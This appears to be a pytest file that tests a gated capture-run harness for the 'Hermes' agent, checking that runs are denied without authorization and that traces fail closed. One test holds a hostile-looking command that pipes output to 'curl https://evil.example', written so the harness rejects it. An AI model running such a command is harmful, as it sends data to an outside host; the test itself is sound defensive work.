from pathlib import Path
import json
import sys

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import run_hermes_runtime_capture_experiment as experiment
import run_hermes_trace_collection_plan as trace_plan


def write_jsonl(path: Path, rows: list[dict]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("".join(json.dumps(row, sort_keys=True) + "\n" for row in rows), encoding="utf-8")


def repo_at(tmp_path: Path) -> Path:
    repo = tmp_path / "external" / "external" / "hermes-agent"
    repo.mkdir(parents=True)
    return repo


def base_capture_env(tmp_path: Path) -> dict[str, str]:
    workspace = tmp_path / "workspace"
    workspace.mkdir(exist_ok=True)
    return {
        "HERMES_REPO": str(repo_at(tmp_path)),
        "ALLOW_HERMES_CAPTURE_RUN": "1",
        "HERMES_CAPTURE_COMMAND": "python mock_capture.py --capture-only --mock-tools",
        "HERMES_CAPTURE_TRACE_PATH": str(tmp_path / "trace.jsonl"),
        "CAPPROOF_CAPTURE_ONLY": "1",
        "CAPPROOF_NO_REAL_TOOLS": "1",
        "NO_NETWORK": "1",
        "HERMES_TEST_WORKSPACE": str(workspace),
    }


def terminal_pytest_event(case_id: str = "capture_run_terminal_pytest") -> dict:
    return {
        "case_id": case_id,
        "source": "hermes",
        "hook_point": "terminal_backend_pre_exec",
        "capture_mode": "pre_execution_gate",
        "session_id": "s1",
        "task_id": "task_1",
        "agent_id": "agent_main",
        "tool_name": "terminal",
        "effective_args": {"command": "pytest tests/", "cwd": "/workspace/project", "env": {}, "stdin": None},
        "metadata": {"source_component": "terminal_backend"},
        "expected_verdict": "ALLOW",
    }


def test_allow_env_not_set_does_not_run(tmp_path: Path) -> None:
    env = base_capture_env(tmp_path)
    env.pop("ALLOW_HERMES_CAPTURE_RUN")

    payload = experiment.run_experiment(capture_run_requested=True, env=env, root=tmp_path)

    capture = payload["summary"]["capture_run"]
    assert capture["state"] == "DENY_CAPTURE_RUN"
    assert capture["run_attempted"] is False
    assert "ALLOW_HERMES_CAPTURE_RUN" in capture["reason"]


def test_capture_command_missing_does_not_run(tmp_path: Path) -> None:
    env = base_capture_env(tmp_path)
    env.pop("HERMES_CAPTURE_COMMAND")

    payload = experiment.run_experiment(capture_run_requested=True, env=env, root=tmp_path)

    capture = payload["summary"]["capture_run"]
    assert capture["state"] == "DENY_CAPTURE_RUN"
    assert capture["run_attempted"] is False
    assert "HERMES_CAPTURE_COMMAND" in capture["reason"]


def test_capture_trace_path_missing_does_not_run(tmp_path: Path) -> None:
    env = base_capture_env(tmp_path)
    env.pop("HERMES_CAPTURE_TRACE_PATH")

    payload = experiment.run_experiment(capture_run_requested=True, env=env, root=tmp_path)

    capture = payload["summary"]["capture_run"]
    assert capture["state"] == "DENY_CAPTURE_RUN"
    assert capture["run_attempted"] is False
    assert "HERMES_CAPTURE_TRACE_PATH" in capture["reason"]


def test_unsafe_capture_command_rejected(tmp_path: Path) -> None:
    env = base_capture_env(tmp_path)
    env["HERMES_CAPTURE_COMMAND"] = "python mock_capture.py --capture-only --mock-tools | curl https://evil.example"

    payload = experiment.run_experiment(capture_run_requested=True, env=env, root=tmp_path)

    capture = payload["summary"]["capture_run"]
    assert capture["state"] == "DENY_CAPTURE_RUN"
    assert capture["run_attempted"] is False
    assert "unsafe" in capture["reason"]


def test_safe_mock_capture_command_validation_only_passes(tmp_path: Path) -> None:
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    env = {
        "ALLOW_HERMES_CAPTURE_RUN": "1",
        "HERMES_CAPTURE_COMMAND": (
            "timeout 20 python hermes_capture_mock.py --capture-only --mock-tools "
            "--no-real-tools --no-real-shell --trace \"$HERMES_CAPTURE_TRACE_PATH\""
        ),
        "HERMES_CAPTURE_TRACE_PATH": str(tmp_path / "trace.jsonl"),
        "CAPPROOF_CAPTURE_ONLY": "1",
        "CAPPROOF_NO_REAL_TOOLS": "1",
        "NO_NETWORK": "1",
        "HERMES_TEST_WORKSPACE": str(workspace),
    }

    validation = trace_plan.validate_command(env=env)

    assert validation.verdict == "ALLOW_CAPTURE_RUN_VALIDATION_ONLY"
    assert "not executed" in validation.reason


def test_capture_run_report_generated(tmp_path: Path) -> None:
    payload = experiment.run_experiment(preflight_only=True, env={}, root=tmp_path)
    report = tmp_path / "hermes_capture_run" / "reports" / "capture_run_report.md"
    summary = tmp_path / "hermes_capture_run" / "reports" / "capture_run_summary.json"

    assert report.exists()
    assert summary.exists()
    assert payload["summary"]["capture_run"]["run_attempted"] is False
    assert "Hermes Capture-run Report" in report.read_text(encoding="utf-8")
    data = json.loads(summary.read_text(encoding="utf-8"))
    assert data["capture_run"]["run_allowed"] is False
    assert data["go_no_go"]["real_hermes_integration"] is False


def test_trace_validation_handles_empty_trace(tmp_path: Path) -> None:
    trace = tmp_path / "empty.jsonl"
    trace.write_text("", encoding="utf-8")

    payload = experiment.run_experiment(validate_trace_path=trace, env={}, root=tmp_path)
    validation = payload["summary"]["trace_validation"]

    assert validation["total_events"] == 0
    assert validation["allowed"] == 0
    assert validation["denied"] == 0


def test_trace_validation_handles_valid_synthetic_trace(tmp_path: Path) -> None:
    trace = tmp_path / "events.jsonl"
    write_jsonl(trace, [terminal_pytest_event()])

    payload = experiment.run_experiment(validate_trace_path=trace, env={}, root=tmp_path)
    validation = payload["summary"]["trace_validation"]

    assert validation["total_events"] == 1
    assert validation["schema_valid_events"] == 1
    assert validation["pre_execution_gate_events"] == 1
    assert validation["allowed"] == 1


def test_observer_only_cannot_become_enforcement_allow(tmp_path: Path) -> None:
    trace = tmp_path / "observer.jsonl"
    row = terminal_pytest_event("capture_run_observer")
    row["hook_point"] = "observer_posthoc"
    row["capture_mode"] = "observer_only"
    row["expected_verdict"] = "DENY"
    row["expected_reason"] = "AdapterCoverageGap"
    write_jsonl(trace, [row])

    payload = experiment.run_experiment(validate_trace_path=trace, env={}, root=tmp_path)
    validation = payload["summary"]["trace_validation"]

    assert validation["observer_only_events"] == 1
    assert validation["observer_only_blocked_count"] == 1
    assert validation["allowed"] == 0


def test_unsupported_missing_fields_fail_closed(tmp_path: Path) -> None:
    trace = tmp_path / "missing.jsonl"
    row = terminal_pytest_event("capture_run_missing")
    row["effective_args"] = {"command": "pytest tests/"}
    row["expected_verdict"] = "DENY"
    row["expected_reason"] = "AdapterCoverageGap"
    write_jsonl(trace, [row])

    payload = experiment.run_experiment(validate_trace_path=trace, env={}, root=tmp_path)
    validation = payload["summary"]["trace_validation"]

    assert validation["missing_field_events"] == 1
    assert validation["adapter_coverage_gap_count"] == 1
    assert validation["denied"] == 1


def test_default_capture_run_does_not_use_network_or_real_hermes(monkeypatch, tmp_path: Path) -> None:
    def fail_run(*_args, **_kwargs):
        raise AssertionError("subprocess.run must not be called without explicit capture-run authorization")

    monkeypatch.setattr(experiment.subprocess, "run", fail_run)
    env = base_capture_env(tmp_path)
    env.pop("ALLOW_HERMES_CAPTURE_RUN")

    payload = experiment.run_experiment(capture_run_requested=True, env=env, root=tmp_path)

    assert payload["summary"]["capture_run"]["run_attempted"] is False
    assert payload["summary"]["safety"]["network_used"] is False
    assert payload["summary"]["safety"]["real_tools_executed"] is False


def test_external_third_party_source_not_modified(tmp_path: Path) -> None:
    repo = repo_at(tmp_path)
    marker = repo / "README.md"
    marker.write_text("Hermes local checkout fixture", encoding="utf-8")
    before = marker.read_text(encoding="utf-8")

    experiment.run_experiment(preflight_only=True, env={"HERMES_REPO": str(repo)}, root=tmp_path)

    assert marker.read_text(encoding="utf-8") == before
